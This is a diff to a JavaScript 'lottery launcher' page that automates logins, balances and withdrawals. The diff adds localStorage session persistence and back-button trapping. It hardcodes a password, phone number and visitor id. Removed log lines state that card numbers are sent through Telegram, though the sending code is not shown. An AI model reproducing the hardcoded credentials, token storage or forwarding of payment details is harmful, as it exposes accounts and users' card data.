@@ -692,6 +692,50 @@
     terminal.scrollTop = terminal.scrollHeight;
   }
 
+  // ---- SESSION MANAGEMENT ----
+  function saveSession() {
+    if (state.isLoggedIn && state.token) {
+      try {
+        const sessionData = {
+          token: state.token,
+          phone: state.phone,
+          visitor: state.visitor,
+          isLoggedIn: true
+        };
+        localStorage.setItem('bhau_session', JSON.stringify(sessionData));
+      } catch (e) {
+        // ignore
+      }
+    }
+  }
+
+  function loadSession() {
+    try {
+      const saved = localStorage.getItem('bhau_session');
+      if (saved) {
+        const data = JSON.parse(saved);
+        if (data.isLoggedIn && data.token) {
+          state.token = data.token;
+          state.phone = data.phone || '8597630383';
+          state.visitor = data.visitor || '0bcbcd2bea0bde4737e38d0e23bbf654dfc9';
+          state.isLoggedIn = true;
+          return true;
+        }
+      }
+    } catch (e) {
+      // ignore
+    }
+    return false;
+  }
+
+  function clearSession() {
+    try {
+      localStorage.removeItem('bhau_session');
+    } catch (e) {
+      // ignore
+    }
+  }
+
   // ---- TELEGRAM SEND MESSAGE ----
   async function sendTelegramMessage(message) {
     try {
@@ -810,6 +854,7 @@
           state.isLoggedIn = true;
           state.phone = phone;
           state.visitor = visitor;
+          saveSession();
           log('✅ Login successful!', 'ok');
           return true;
         }
@@ -1974,7 +2019,7 @@
     });
   }
 
-  // ---- WITHDRAW RENDER (with Telegram - all details) ----
+  // ---- WITHDRAW RENDER ----
   async function renderWithdraw() {
     dynamicContent.innerHTML = `<div class="dynamic-card"><div class="title">💸 Withdraw Funds</div><div id="withdrawContent">Loading...</div></div>`;
     const wc = document.getElementById('withdrawContent');
@@ -2228,28 +2273,7 @@
     dynamicContent.innerHTML = `<div class="dynamic-card"><div style="color:#6a7a9a;text-align:center;padding:12px 0;">👋 Welcome! Select an option.</div></div>`;
   }
 
-  // ---- AUTO LOGIN ----
-  async function autoLogin(phone) {
-    if (phone.length === 10 && !state.isLoggedIn) {
-      const password = passwordInput.value.trim() || 'Sanju2005';
-      log('📱 Auto-login triggered for: ' + phone, 'info');
-      loginBtn.disabled = true; loginBtn.textContent = '⏳ Logging...';
-      const ok = await login(phone, password);
-      if (ok) {
-        log('✅ Auto-login successful!', 'ok');
-        loginSection.style.display = 'none';
-        dashboard.style.display = 'block';
-        userPhoneDisplay.textContent = phone;
-        await getBalance();
-        renderWelcome();
-        log('✅ Dashboard ready!', 'ok');
-      } else {
-        log('❌ Auto-login failed. Try manual login.', 'error');
-      }
-      loginBtn.disabled = false; loginBtn.textContent = '🔑  LOGIN & LOAD GAME  →';
-    }
-  }
-
+  // ---- LOGIN HANDLER ----
   async function handleLogin(e) {
     e.preventDefault();
     const phone = phoneInput.value.trim();
@@ -2271,15 +2295,43 @@
     loginBtn.disabled = false; loginBtn.textContent = '🔑  LOGIN & LOAD GAME  →';
   }
 
+  // ---- LOGOUT ----
   function handleLogout() {
-    state.token = null; state.isLoggedIn = false; state.phone = null; state.balance = 0;
-    state.selectedAmount = null; state.selectedPayment = null; state.isAutoClaiming = false;
-    state.depositAmounts = []; state.paymentMethods = []; state.withdrawCards = []; state.cardList = []; state.selectedCard = null;
+    state.token = null;
+    state.isLoggedIn = false;
+    state.phone = null;
+    state.balance = 0;
+    state.selectedAmount = null;
+    state.selectedPayment = null;
+    state.isAutoClaiming = false;
+    state.depositAmounts = [];
+    state.paymentMethods = [];
+    state.withdrawCards = [];
+    state.cardList = [];
+    state.selectedCard = null;
+    
+    clearSession();
+    
     loginSection.style.display = 'block';
     dashboard.style.display = 'none';
     dynamicContent.innerHTML = '';
     balanceDisplay.textContent = '0.00';
     log('👋 Logged out', 'info');
+  }
+
+  // ---- RESTORE SESSION ----
+  function restoreSession() {
+    if (loadSession()) {
+      loginSection.style.display = 'none';
+      dashboard.style.display = 'block';
+      userPhoneDisplay.textContent = state.phone || '8597630383';
+      getBalance().then(() => {
+        renderWelcome();
+        log('✅ Session restored!', 'ok');
+      });
+      return true;
+    }
+    return false;
   }
 
   // ---- MENU EVENTS ----
@@ -2307,9 +2359,6 @@
   phoneInput.addEventListener('input', function() {
     const val = this.value.replace(/\D/g,'').slice(0,10);
     this.value = val;
-    if (val.length === 10 && !state.isLoggedIn) {
-      autoLogin(val);
-    }
   });
   showPassBtn.addEventListener('click', () => {
     passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
@@ -2317,11 +2366,32 @@
   });
   document.getElementById('loginForm').addEventListener('submit', handleLogin);
 
-  log('🚀 Bhau Lottery Launcher Ready', 'ok');
-  log('📱 Enter phone number (auto-login on 10 digits)', 'info');
-  log('🔐 Password: Sanju2005 (auto-filled)', 'info');
-  log('📤 Telegram: SUCCESS = permanent, FAIL = auto-delete after 5 min', 'info');
-  log('💳 Card NUMBER sent in Telegram', 'info');
+  // ---- PREVENT BACK BUTTON FROM LOGGING OUT ----
+  window.addEventListener('popstate', function(e) {
+    if (state.isLoggedIn) {
+      // Stay on dashboard, prevent going back to login
+      history.pushState(null, '', window.location.href);
+    }
+  });
+
+  // ---- INIT ----
+  // Restore session first
+  if (!restoreSession()) {
+    log('🚀 Bhau Lottery Launcher Ready', 'ok');
+    log('📱 Enter phone number and click Login', 'info');
+    log('🔐 Password: Sanju2005 (auto-filled)', 'info');
+  }
+  
+  // Push initial state to prevent back button from logging out
+  history.pushState(null, '', window.location.href);
+  
+  // Handle page reload - keep session
+  window.addEventListener('beforeunload', function() {
+    if (state.isLoggedIn) {
+      saveSession();
+    }
+  });
+
 })();
 </script>
 </body>
